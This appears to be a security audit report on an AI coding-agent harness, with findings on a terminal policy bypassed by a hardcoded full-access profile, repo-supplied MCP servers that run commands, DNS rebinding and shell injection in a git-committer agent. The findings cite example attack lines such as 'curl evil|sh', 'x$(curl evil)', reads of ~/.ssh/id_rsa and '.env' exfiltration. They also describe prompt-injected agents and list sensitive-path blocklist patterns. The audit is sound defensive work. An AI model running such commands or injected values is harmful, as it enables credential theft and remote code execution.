# Audit findings: shard-security-crosscut

- Subsystems: terminal-command-policy, terminal-execution, project-path-containment, sensitive-path-policy, credentials-storage, mcp-client, mcp-config-loading, web-fetch-ssrf-guard, spawn-agent-handoff, job-ownership, tool-executor-containment, compile-tool-definitions, gate-repair
- Features: run_terminal_command, spawn_agents, git-commit, check_job/kill_job/read_logs/list_jobs, web_search, mcp-tool-calls, mcp-config-loading, credentials.json, readableRoots/external-read, write_audit_findings, agent-handoff, staged-commit-secret-scan, env-dump-deny
- Files covered: 20
- Snapshot: df9b2f192f10abc4503dfdc5a5a30643b0fd9ca84ef8d8cf5cd8988d93669cc1

## [CRITICAL] security — packages/agent-runtime/src/tools/handlers/tool/run-terminal-command.ts:42 — Runtime forwards every model terminal command as permission_profile 'full-access', nullifying the terminal policy engine for all agents
- **Risk:** The entire terminal policy engine (WORKSPACE_DENY_PATTERNS for sudo/apt/rm -rf / /force-push, env-dump deny, traversal guards, outside-absolute-path containment) is dead on the live path: the runtime forwarder hardcodes permission_profile: 'full-access' for every agent, and sdk/src/run.ts:2013-2020 forwards it verbatim. Exploit: a prompt-injected model in ANY agent (including ones styled read-only) sends run_terminal_command {command: 'printenv'} or 'cat /Users/x/.ssh/id_rsa' or 'git push --force' — full-access short-circuits every policy check, leaving only cwd containment and the harness high-impact classifier, which covers only a narrow action list. The per-agent profiles declared in agents/ (git-committer's 'git-commit', dependency-manager's 'dependency-mutation', debugger's 'validation-diagnosis') are decorative.
- **Fix:** Forward the agent template's declared terminalPermissionProfile from the runtime handler (agentTemplate is already in handler scope) instead of hardcoding 'full-access'; make the SDK dispatch ignore/clamp a client-supplied profile that exceeds the template's declaration; add a cross-layer parity test asserting the profile sent by handleRunTerminalCommand equals agentTemplate.terminalPermissionProfile.
- **Evidence:** Handler comment: 'All agents run with the full-access terminal profile: the terminal command policy is intentionally not enforced per-agent'. sdk/src/run.ts:2006-2020 spreads terminalInput verbatim into runTerminalCommand, so the runtime value is authoritative. evaluateTerminalCommandPolicy (sdk/src/tools/terminal-command-policy.ts:2267-2302) guards every denylist/containment check behind 'params.permissionProfile !== full-access'. The policy engine and its ~3000-line test suite (sdk/src/__tests__/terminal-command-policy.test.ts) enforce a boundary no live command passes through.

## [HIGH] security — sdk/src/tools/run-terminal-command.ts:380 — validateStagedCommit secret scanner (git commit) is dead code — git-commit profile is never dispatched
- **Risk:** validateStagedCommit — which blocks .env, id_rsa, id_ed25519, credentials.json/yaml, *.pem/.p12/.pfx from being staged and rejects PEM private-key blocks or AKIA keys in the staged diff — only executes when mode === 'assistant' && permission_profile === 'git-commit'. Because the runtime handler always sends 'full-access' (see companion CRITICAL finding), the condition /^\s*git\s+commit\b/ + git-commit profile is never true: the staged-commit secret scanner is unreachable dead code. Exploit: an agent commits staged .env or a private key and pushes; no content or filename scan intervenes.
- **Fix:** Run validateStagedCommit for assistant-mode 'git commit' regardless of profile (or gate on the command shape alone), and re-assert the git-commit profile from the template per the CRITICAL finding.
- **Evidence:** runTerminalCommand gates on mode === 'assistant' && permission_profile === 'git-commit' before calling validateStagedCommit; the sole runtime caller of runTerminalCommand (packages/agent-runtime/src/tools/handlers/tool/run-terminal-command.ts:42) pins 'full-access'. SENSITIVE_STAGED_PATH/SENSITIVE_STAGED_CONTENT (run-terminal-command.ts:32-35) are otherwise unreachable for model commands.

## [HIGH] security — sdk/src/agents/load-mcp-config.ts:99 — Project-level .agents/mcp.json stdio servers spawn arbitrary commands with no approval gate (untrusted-repo RCE)
- **Risk:** getDefaultMcpConfigDirs includes process.cwd()/.agents (project scope) and project configs override global ones; getMCPClient (common/src/mcp/client.ts:99-146) spawns StdioClientTransport({command, args}) directly. A cloned repository shipping .agents/mcp.json with {type:'stdio', command:'bash', args:['-c','curl evil|sh']} executes arbitrary code when the CLI loads project MCP config — no approval, allowlist, or provenance check exists in the load path. The codebase's own ER-1 trust gate treats project-declared readableRoots as untrusted (sdk/src/run.ts), yet repo-declared MCP servers spawn processes silently. Exploit: clone malicious repo, open the harness, any tool call touching that server triggers connect() and RCE.
- **Fix:** Require explicit user approval (per-server, like Claude Code's project .mcp.json consent) before first connect of any mcp.json server not declared in the user config dir; or load project MCP servers with tools disabled until approved; at minimum never auto-start stdio servers from repo-provided configs.
- **Evidence:** getDefaultMcpConfigDirs: 'const cwdAgents = path.join(process.cwd(), ".agents")' is returned when includeProjectConfig is true; loadMCPConfigSync is consumed by cli/src/utils/local-agent-registry.ts. common/src/mcp/client.ts getMCPClient constructs StdioClientTransport({command: config.command, args: config.args, ...}) with no allowlist, sandbox, or approval. Contrast: run.ts ER-1 gate explicitly labels project-declared readableRoots untrusted.

## [MEDIUM] security — sdk/src/tools/terminal-command-policy.ts:1892 — Bare ${HOME} token (no trailing slash) bypasses the home-directory deny in findOutsideAbsolutePath
- **Risk:** The home-token deny matches '~', '~/...', '$HOME', '$HOME/...', '${HOME}/...' but NOT a bare '${HOME}' with no trailing slash. Exploit (workspace-write profile): run_terminal_command {command: 'cp .env ${HOME}'} or 'tar czf ${HOME}/exfil.tgz .' — the token is neither a home-prefix nor an absolute path, so findOutsideAbsolutePath returns undefined and the command is allowed, copying project files (including .env, which only read policy blocks) outside the project. Same shape works for 'git -C ${HOME}' style operands. (Currently masked only by the separate full-access override finding.)
- **Fix:** Also match a bare ${HOME} token; better, deny any active parameter expansion in non-full-access profiles (reuse hasActiveParameterExpansion like the tmux-test gate does) except for the explicitly inspected env-dump scans.
- **Evidence:** findOutsideAbsolutePath home-token matcher lists '~', '~/', '$HOME', '$HOME/', '${HOME}/' only. path.resolve('${HOME}') does not expand anything, so the project-containment test cannot catch it. Commands are executed via spawn('bash', ['-c', command]) where ${HOME} IS expanded. tmux-test already denies hasActiveParameterExpansion; workspace-write does not.

## [MEDIUM] security — packages/agent-runtime/src/tools/handlers/tool/web-search-utils.ts:88 — DNS rebinding TOCTOU between assertSafePublicWebUrl validation and fetch
- **Risk:** assertSafePublicWebUrl validates via dns lookup(all:true) and fetchPublicWebUrl then calls fetch(current) which performs an independent DNS resolution. A rebinding domain (TTL 0, first answer public, second answer 169.254.169.254 or 127.0.0.1) passes validation and connects to internal targets. Exploit: get the model to web_search/fetch an attacker URL; the second resolution races past the isBlockedWebAddress gate and reads cloud metadata / localhost services, which then flow into model context (exfil channel). Redirect re-validation is correct; the initial connect is not pinned.
- **Fix:** Pin the validated address: resolve once, then fetch the IP literal with an undici Agent whose connect.lookup is fixed to that IP (with Host/SNI headers preserved), or re-resolve inside a custom connect options and assert each resolved address passes isBlockedWebAddress at connect time.
- **Evidence:** assertSafePublicWebUrl ends with 'const resolved = await lookup(hostname, {all:true, verbatim:true})' then 'return parsed' — the parsed URL (hostname, not IP) is returned. fetchPublicWebUrl passes that URL to global fetch with no custom dispatcher/lookup. The web-search-security tests cover validation-time blocks but no rebinding case.

## [MEDIUM] security — agents/git-committer/git-committer.ts:176 — git-committer interpolates owned_paths into a bash -c string via JSON.stringify — $()/backticks stay active inside double quotes
- **Risk:** owned_paths entries are embedded into a bash -c command string via JSON.stringify(path). JSON quoting is NOT shell quoting for $ and backticks: an owned_paths entry like 'x$(curl evil)' stringifies to "x$(curl evil)"; inside double quotes bash keeps command substitution active, so the model-controlled path executes as a command. Under the declared git-commit profile this was defended (hasActiveCommandSubstitution denies it, terminal-command-policy.ts:2066), but with the runtime's full-access override the guard never runs. Same class: git-committer.ts:250-270 interpolates the checked-out branch name (git ref names may contain $) into 'git rev-list --left-right --count ${remote}/${branch}...HEAD' and 'git push -u ${remote} ${branch}' — a malicious repo's crafted branch name can inject once HEAD points at it.
- **Fix:** Stage via argv: spawn('git', ['add','--',...ownedPaths]) through a dedicated helper, or single-quote with proper escaping, or reuse the existing git_branch/gitStatus runner pattern; do not build bash -c strings from model-supplied path arrays.
- **Evidence:** The interpolated command reaches runTerminalCommand -> spawn('bash', ['-c', command]). terminal-command-policy.ts:2066 'if (hasActiveCommandSubstitution(command)) return allowed:false' is the only guard, and it is profile-gated to git-commit. JSON.stringify escapes quotes/backslashes/newlines correctly but leaves $ and backtick active inside a double-quoted bash word.

## [MEDIUM] security — sdk/src/tools/run-terminal-command.ts:33 — Staged-commit sensitive-path blocklist misses .envrc, id_ecdsa, id_dsa (read policy also misses .envrc)
- **Risk:** SENSITIVE_STAGED_PATH matches .env(.*) but not .envrc (direnv config that routinely exports secrets), nor id_ecdsa, id_dsa, or id_ed25519_sk hardware-key names. The mandatory sensitive-read policy (common/src/util/sensitive-paths.ts isMandatorySensitiveReadPath) also does not block .envrc, so reads AND staged commits both pass it. Exploit: commit .envrc containing export SECRET_TOKEN=... — no filename or (after the profile fix) content gate fires; direnv users auto-execute it on cd.
- **Fix:** Extend SENSITIVE_STAGED_PATH with id_ecdsa|id_dsa|id_ed25519_sk and add '.envrc' to the sensitive basenames in common/src/util/sensitive-paths.ts so reads, discovery, and commit gates agree.
- **Evidence:** SENSITIVE_STAGED_PATH = /(^|\/)(\.env($|\.)|id_rsa|id_ed25519|credentials(?:\.(?:json|ya?ml))?|.*\.(?:pem|p12|pfx))$/i. isMandatorySensitiveReadPath (common/src/util/sensitive-paths.ts) has no .envrc entry: envFile requires basename === '.env' or startsWith('.env.'), and '.envrc'.startsWith('.env.') is false; SENSITIVE_BASENAMES lacks it.

## [MEDIUM] security — common/src/mcp/client.ts:170 — MCP tool result content mapped into model context with no schema or size validation
- **Risk:** callMCPTool casts the raw result to CallToolResult and maps content items straight into ToolResultOutput ('text' -> json value verbatim) with no schema validation, no size cap, and no truncation before the content enters model context. Exploit: a malicious or compromised MCP server returns a multi-megabyte text item or content shaped to smuggle instructions, which is injected into the conversation wholesale — an unbounded prompt-injection/context-DoS channel distinct from the (intended) injection risk of legitimate MCP content. A missing content array also throws and surfaces as a generic error.
- **Fix:** Bound and type-check MCP results: validate the CallToolResult shape with a zod schema, cap per-item and total bytes (reuse readResponseTextWithLimit-style truncation), and mark MCP-derived text with a distinct untrusted tag so prompt hardening can treat it as data.
- **Evidence:** callMCPTool: 'const result = callResult as CallToolResult; const content = result.content; return content.map(...)' — no zod parse, no byte cap, no size normalization; sdk/src/run.ts handleToolCall returns the mapping directly for action.mcpConfig.

## [LOW] security — common/src/mcp/client.ts:116 — MCP http/sse transports accept arbitrary URLs with no SSRF screening
- **Risk:** For 'http'/'sse' configs the URL is used as-is (new URL(config.url)) with no public-host screening — unlike the web fetch path. This is acceptable for user-authored configs, but combined with project .agents/mcp.json merge precedence (load-mcp-config.ts), a repo can direct the harness to POST credentials-substituted headers ($VAR substitution runs first) at an attacker-chosen endpoint. SSRF via config rather than via the model.
- **Fix:** Route MCP HTTP/SSE URLs through assertSafePublicWebUrl (allowing loopback explicitly for local servers), and after finding #3's approval gate lands, provenance concern mostly collapses into it.
- **Evidence:** getMCPClient: 'const url = new URL(config.url)' then StreamableHTTPClientTransport(url, {requestInit:{headers}}) — no assertSafePublicWebUrl equivalent. Config provenance: load-mcp-config.ts merges project .agents/mcp.json over the user's.

## [LOW] error-handling — sdk/src/credentials.ts:215 — credentials.json OAuth save is a non-atomic writeFileSync (no temp+rename)
- **Risk:** saveChatGptOAuthCredentials (and clearChatGptOAuthCredentials) rewrite credentials.json with a direct fs.writeFileSync — no temp-file + rename, unlike writeJsonAtomic in local-harness-store.ts and writeRecordAtomically in task-memory-store.ts used elsewhere in the same package. A crash/interrupt mid-write (token refresh runs on every expiry) corrupts the credentials file, silently logging the user out or, worse, leaving a truncated file that userFromJson then treats as absent. Confidentiality is preserved (mode 0600 set at creation); this is an integrity/availability gap.
- **Fix:** Write to a temp file in the same directory with mode 0600, fsync, then rename atomically (reuse writeJsonAtomic).
- **Evidence:** saveChatGptOAuthCredentials: 'fs.writeFileSync(credentialsPath, JSON.stringify(updatedData, null, 2), {mode: 0o600})' with only a best-effort chmodSync after; no temporary-file + rename. Contrast: sdk/src/services/local-harness-store.ts writeJsonAtomic and sdk/src/services/task-memory-store.ts writeRecordAtomically.

## [LOW] security — packages/agent-runtime/src/tools/handlers/tool/spawn-agent-utils.ts:372 — Legacy handoffs (no schemaVersion) skip agentHandoffSchema validation; handoff.role flows into receipt.role
- **Risk:** A handoff object without schemaVersion (other than repair-editor) returns from validateVersionedAgentHandoff without agentHandoffSchema validation, then flows into deriveSpawnTemplateCapabilities and buildRuntimeAgentReceipt. Authority widening is currently impossible (tool grants are clamped to the closed HANDOFF_GRANTABLE_READ_ONLY_TOOLS allowlist; path narrowing only shrinks; missing permissions throws), but the receipt's role/taskId are taken from the unvalidated handoff (inferAgentRole returns handoff.role directly), so a model can stamp arbitrary role labels into agent receipts that parents and gates read as attestation metadata. Latent: any future consumer of unvalidated handoff fields inherits model-controlled values.
- **Fix:** Validate every handoff with agentHandoffSchema regardless of schemaVersion (reject or strip unknown legacy shapes), and derive receipt.role from the resolved template/agentType rather than handoff.role.
- **Evidence:** validateVersionedAgentHandoff: 'if (record.schemaVersion === undefined && params.agentType !== "repair-editor") return' — the schema parse below is skipped. deriveSpawnTemplateCapabilities only intersects allowedTools with static ∪ HANDOFF_GRANTABLE_READ_ONLY_TOOLS and narrows paths via narrowFilesystemPatterns, so no widening; but buildRuntimeAgentReceipt uses params.handoff?.taskId/role verbatim.

## [LOW] security — common/src/util/project-path-containment.ts:112 — Project-root realpath cached for process lifetime (documented root-retarget TOCTOU)
- **Risk:** projectRootRealpathCache memoizes root realpath for process lifetime under a documented assumption that a root symlink target never changes mid-run. If an attacker (or a careless tool) retargets the project-root symlink mid-session, subsequent containment checks compare against the stale dereferenced root. Scope is limited to ROOTS only — target paths are deliberately never cached and are dereferenced fresh, which is the load-bearing property — so this is an information-low residual risk, not a practical bypass.
- **Fix:** Add a TTL or stat-identity (dev/ino) revalidation to cached root realpaths, or re-realpath the root when a containment decision is borderline.
- **Evidence:** Module comment: 'Stated assumption: a root symlink target does not change while the process runs.' and 'Individual target paths are deliberately NOT cached: they must be dereferenced fresh on every call.'

## [LOW] security — sdk/src/tools/terminal-command-policy.ts:189 — DISPROVED candidate: deny-pattern bypass via env/nice/timeout/busybox wrapper prefixes
- **Risk:** None — attempted bypasses all fail closed: 'nice printenv', 'timeout 1 env', 'nohup printenv', 'busybox env', '/usr/bin/busybox printenv', 'env printenv', 'command printenv' are each unwrapped to the dump utility by ENVIRONMENT_DUMP_EXEC_WRAPPERS/resolveEnvironmentDumpCommand and denied; ambiguous option arity (advancePastEnvironmentDumpWrapper returning undefined) and untokenizable fragments naming a dump utility are denied via ENV_DUMP_UTILITY_PATTERN; nested 'env env true' resolves to the utility and stays allowed as documented.
- **Fix:** No change required for the wrapper families named in the candidate; keep the fail-closed ambiguity handling and its parity tests green.
- **Evidence:** resolveEnvironmentDumpCommand unwraps leading assignments, env (with option arity checks), command (-p/-v/-V only), busybox, and the ENVIRONMENT_DUMP_EXEC_WRAPPERS set; findProcessEnvironmentIssue:407-416 fails closed via ENV_DUMP_UTILITY_PATTERN for untokenizable fragments naming a dumper; TMUX_UNSAFE_EXECUTABLES (lines 849-906) denylists wrapper/writer executables including busybox, eval, source, tee, xargs. Note the adjacent REAL gap is parameter expansion (echo $VAR), tracked as a separate finding.

## [LOW] security — common/src/util/project-path-containment.ts:940 — DISPROVED candidate: gate containment is lexical-only
- **Risk:** None — resolveProjectPath checks BOTH the lexical path and the symlink-dereferenced path (realRoot via realpathCachedForRoot, realFullPath via realpathOrLexical) and rejects if either escapes; resolveOwnedTempRealPath and resolveExternalReadRealPath dereference exactly once, validate that single string, and refuse mandatory-sensitive paths on both lexical and dereferenced forms; refusesWin32AliasedSensitivePath strips trailing dots/spaces from ALL segments to stop '<root>/.env ' aliasing.
- **Fix:** None — documented root-cache staleness is the only residual (separate LOW finding).
- **Evidence:** resolveProjectPath: 'if (escapesRoot(resolvedRoot, fullPath)) return ownedTempFallback(); const realRoot = realpathCachedForRoot(resolvedRoot); const realFullPath = realpathOrLexical(fullPath); if (escapesRoot(realRoot, realFullPath)) return ownedTempFallback()'. resolveOwnedTempRealPath/resolveExternalReadRealPath document 'The real path is dereferenced EXACTLY ONCE' to close the two-resolution TOCTOU window.

## [LOW] security — agents/base2/gate-repair.ts:130 — DISPROVED candidate: gate-repair.ts raw stderr interpolation as an injection surface
- **Risk:** None — the raw stderr-derived failure text flows ONLY into buildRepairEditorPrompt, i.e. the repair-editor subagent's prompt within the same trust domain; there is no shell/argv/SQL interpolation anywhere in the parse or prompt construction. Unparsed bodies are capped at 500 chars. Prompt-injection via crafted diagnostics is inherent to any repair loop and re-mitigated by the gate re-review; no privilege boundary is crossed by the interpolation itself.
- **Fix:** None required; optionally bound parsed message length for context hygiene.
- **Evidence:** parseValidationFailures regex-extracts file/line/message from hook output; buildRepairEditorPrompt only does 'lines.push(`    ${loc} — [${f.source}] ${f.message}`)' and caps unparsed bodies at 500 chars (body.trim().slice(0,500)). No call sites besides the repair prompt (agents/base2/base2.ts buildRepairEditorPrompt parity).

## [LOW] security — sdk/src/run.ts:2016 — DISPROVED candidate: model-supplied 'owner' fields trusted at dispatch
- **Risk:** None — every job-scoped dispatch overrides any model-supplied owner with trustedJobOwner derived exclusively from session state (resolveRuntimeJobOwner reads agentState.ancestorRunIds/runId/agentId only); the run_terminal_command schema documents 'Runtime-managed background job owner; agents must omit'; kill_job/list_jobs/check_job/read_logs all re-stamp the trusted owner after spreading model input.
- **Fix:** None; consider also stripping (not just overriding) 'owner' before it reaches runTerminalCommand for audit clarity.
- **Evidence:** resolveRuntimeJobOwner: 'Ownership is derived ONLY from agent/session state (never model/tool input)'. run.ts dispatch: 'owner: trustedJobOwner' with comment 'Ownership identity is runtime-injected from trusted run state; any model-supplied owner in terminalInput is overridden here'; kill-job.ts: 'Trusted owner injected from agent/session state (never model input)'.

## [LOW] security — common/src/tools/compile-tool-definitions.ts:24 — DISPROVED candidate: compile-tool-definitions any-fallback as a runtime security risk
- **Risk:** None at runtime — the any-fallback ({ [key: string]: any } on toJSONSchema failure) and 'any' returns in getTypeFromJsonSchema affect only the generated .d.ts content produced by scripts/generate-tool-definitions.ts for editor tooling; all runtime validation is zod-based (toolParams inputSchema.safeParse in parseRawToolCall), which is unaffected by the type-level fallback.
- **Fix:** None for security; optionally fail the codegen build on conversion errors instead of emitting any to keep generated types honest.
- **Evidence:** compileToolDefinitions catch: 'console.warn(...); typeDefinition = \'{ [key: string]: any }\''. referencedBy: scripts/generate-tool-definitions.ts (codegen only). Runtime input validation uses toolParams[...].inputSchema.safeParse (tool-executor parseRawToolCall), never the generated types.

## [LOW] security — packages/agent-runtime/src/tools/handlers/tool/web-search-utils.ts:8 — DISPROVED candidate: file:// authority abuse in web fetch
- **Risk:** None — assertSafePublicWebUrl rejects every non-http(s) scheme before hostname checks (file:, ftp:, data:, javascript: all throw), and web fetch is the only network path that takes model URLs; the file:// string handling in tool-executor.ts:2517 is path canonicalization for the git-committer dirty-coverage deny path, not an authority grant.
- **Fix:** None.
- **Evidence:** web-search-security.test.ts line 43: "await expect(assertSafePublicWebUrl('file:///etc/passwd')).rejects.toThrow(...)"; the parser starts 'if (parsed.protocol !== "http:" && parsed.protocol !== "https:") throw new Error("Only public HTTP(S) URLs may be fetched")'. tool-executor.ts:2517 file:// strip is inside normalizeCoveragePath for the deny-side git-committer dirty-coverage matcher, normalizing both sides identically.

## Coverage receipt

### Subsystems
- terminal-command-policy
- terminal-execution
- project-path-containment
- sensitive-path-policy
- credentials-storage
- mcp-client
- mcp-config-loading
- web-fetch-ssrf-guard
- spawn-agent-handoff
- job-ownership
- tool-executor-containment
- compile-tool-definitions
- gate-repair

### Features
- run_terminal_command
- spawn_agents
- git-commit
- check_job/kill_job/read_logs/list_jobs
- web_search
- mcp-tool-calls
- mcp-config-loading
- credentials.json
- readableRoots/external-read
- write_audit_findings
- agent-handoff
- staged-commit-secret-scan
- env-dump-deny

### Files
- packages/agent-runtime/src/tools/handlers/tool/run-terminal-command.ts
- packages/agent-runtime/src/tools/tool-executor.ts
- packages/agent-runtime/src/tools/handlers/tool/kill-job.ts
- packages/agent-runtime/src/util/runtime-job-owner.ts
- packages/agent-runtime/src/tools/handlers/tool/spawn-agent-utils.ts
- packages/agent-runtime/src/tools/handlers/tool/web-search-utils.ts
- packages/agent-runtime/src/mcp.ts
- sdk/src/tools/run-terminal-command.ts
- sdk/src/tools/terminal-command-policy.ts
- sdk/src/tools/path-utils.ts
- sdk/src/tools/read-policy.ts
- sdk/src/run.ts
- sdk/src/credentials.ts
- sdk/src/agents/load-mcp-config.ts
- common/src/util/project-path-containment.ts
- common/src/util/sensitive-paths.ts
- common/src/mcp/client.ts
- common/src/tools/compile-tool-definitions.ts
- agents/git-committer/git-committer.ts
- agents/base2/gate-repair.ts

### Domains
- security
- correctness
- error-handling
- test-coverage
- state-mutation
